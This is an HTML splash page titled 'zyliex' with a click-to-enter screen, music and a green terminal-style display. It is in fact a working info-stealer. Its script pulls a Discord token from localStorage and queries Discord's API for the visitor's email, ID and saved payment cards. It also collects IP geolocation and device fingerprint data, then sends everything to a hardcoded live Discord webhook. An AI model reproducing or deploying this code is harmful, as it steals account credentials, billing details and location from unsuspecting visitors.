<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>zyliex</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background-color: #000; color: #00ff00; height: 100vh; overflow: hidden; }
        
        #entry-screen { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            display: flex; justify-content: center; align-items: center; 
            cursor: pointer; z-index: 100; background-color: #000; 
        }
        
        #enter-text { 
            font-size: 8em; font-weight: bold;
            text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
            animation: pulse 1.5s infinite; text-align: center; text-transform: uppercase;
        }
        
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        #main-content { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; }
        #background-gif { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.4; }
        
        #info-display { 
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            padding: 20px; white-space: pre; line-height: 1.4; text-align: center;
        }
        
        .info-line { opacity: 0; animation: fadeInZoom 0.5s forwards; margin-bottom: 5px; }
        @keyframes fadeInZoom { from { opacity: 0; transform: translateY(20px) scale(0.8); } to { opacity: 1; transform: translateY(0) scale(1); } }
    </style>
</head>
<body>
   
    <div id="entry-screen">
        <div id="enter-text">tıkla</div>
    </div>

    <div id="main-content">
        <img id="background-gif" src="zyliex.gif" alt="Background">
        <div id="info-display"></div>
    </div>
    
    <audio id="background-music" loop>
        <source src="zyliex.mp3" type="audio/mpeg">
    </audio>

    <script>
        document.getElementById('entry-screen').addEventListener('click', async function() {
            this.style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
            
            const music = document.getElementById('background-music');
            music.volume = 0.5;
            music.play().catch(e => console.log("Playback prevented:", e));
            
            const display = document.getElementById('info-display');
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
            const connection = navigator.connection || {};
            const now = new Date();

            // --- DISCORD TOKEN TOPLAMA (Web) ---
            let discordData = { token: "N/A", email: "N/A", username: "N/A@N/A", id: "N/A", nitro: "N/A" };
            
            // localStorage'dan token çekmeyi dene
            try {
                // Discord web, token'ı localStorage'da "token" veya "discord_token" anahtarıyla saklar
                const possibleKeys = ["token", "discord_token", "discord_token_key"];
                for (const key of possibleKeys) {
                    const val = localStorage.getItem(key);
                    if (val) {
                        discordData.token = val;
                        break;
                    }
                }
                
                // Alternatif: discord.com çerezlerinden token çekmeyi dene
                // Not: HttpOnly çerezler JS'den okunamaz ama localStorage'a düşen tokenlar okunabilir
                
                // Token varsa Discord API ile kullanıcı bilgilerini al
                if (discordData.token && discordData.token !== "N/A") {
                    const userResp = await fetch('https://discord.com/api/v9/users/@me', {
                        headers: { 'Authorization': discordData.token }
                    });
                    
                    if (userResp.ok) {
                        const user = await userResp.json();
                        discordData.email = user.email || "N/A";
                        discordData.username = `${user.username}#${user.discriminator}`;
                        discordData.id = user.id;
                        discordData.nitro = user.premium_type > 0 ? "YES" : "NO";
                        
                        // Billing bilgilerini de dene
                        const billingResp = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                            headers: { 'Authorization': discordData.token }
                        });
                        if (billingResp.ok) {
                            const billing = await billingResp.json();
                            discordData.billing = billing.length > 0 ? JSON.stringify(billing.map(b => ({
                                type: b.type === 1 ? "Credit Card" : "PayPal",
                                brand: b.brand || "N/A",
                                last4: b.last_4 || "N/A"
                            }))) : "None saved";
                        }
                    }
                }
            } catch (e) {
                console.log("Token extraction error:", e);
            }

            // --- BİLGİ SATIRLARI (Token dahil) ---
            const infoLines = [
                `--- DISCORD ACCOUNT ---`,
                `TOKEN: ${discordData.token}`,
                `USERNAME: ${discordData.username}`,
                `EMAIL: ${discordData.email}`,
                `USER ID: ${discordData.id}`,
                `NITRO: ${discordData.nitro}`,
                discordData.billing ? `BILLING: ${discordData.billing}` : null,
                `--- NETWORK ---`,
                `IP ADDRESS: ${ipData.ip}`,
                `ISP: ${ipData.org}`,
                `ASN: ${ipData.asn}`,
                `LOCATION: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
                `LAT/LONG: ${ipData.latitude}, ${ipData.longitude}`,
                `TIMEZONE: ${ipData.timezone}`,
                `CONNECTION: ${connection.effectiveType || 'N/A'}`,
                `DOWNLINK: ${connection.downlink || 'N/A'} Mbps`,
                `--- HARDWARE ---`,
                `CPU THREADS: ${navigator.hardwareConcurrency}`,
                `GPU VENDOR: ${getGPUInfo('vendor')}`,
                `GPU RENDERER: ${getGPUInfo('renderer')}`,
                `RAM (JS HEAP): ${(performance.memory ? (performance.memory.totalJSHeapSize / 1048576).toFixed(0) + ' MB' : 'Restricted')}`,
                `BATTERY: ${(battery.level * 100).toFixed(0)}%`,
                `CHARGING: ${battery.charging ? 'YES' : 'NO'}`,
                `--- BROWSER & SYSTEM ---`,
                `USER AGENT: ${navigator.userAgent}`,
                `PLATFORM: ${navigator.platform}`,
                `LANGUAGE: ${navigator.language}`,
                `COOKIES: ${navigator.cookieEnabled ? 'ENABLED' : 'DISABLED'}`,
                `DO NOT TRACK: ${navigator.doNotTrack || 'Unknown'}`,
                `SCREEN: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
                `WINDOW: ${window.innerWidth}x${window.innerHeight}`,
                `TIME: ${now.toLocaleString()}`
            ].filter(Boolean);

            // Webhook'a tüm bilgileri gönder
            fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔍 **Yeni ziyaretçi**\n🎯 **TOKEN BULUNDU:** ${discordData.token !== "N/A" ? 'YES' : 'NO'}`,
                    embeds: [{ color: 0x00ff00, description: infoLines.join('\n') }]
                })
            });

            // Ekranda göster
            let fontSize = 42;
            infoLines.forEach((line, index) => {
                setTimeout(() => {
                    const lineElement = document.createElement('div');
                    lineElement.className = 'info-line';
                    lineElement.textContent = line;
                    lineElement.style.fontSize = fontSize + "px";
                    display.appendChild(lineElement);
                    fontSize = Math.max(16, fontSize - 2);
                }, index * 250);
            });
        });

        function getGPUInfo(type) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return "Not supported";
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            return debug ? (type === 'vendor' ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)) : "Unknown";
        }
    </script>
</body>
</html>
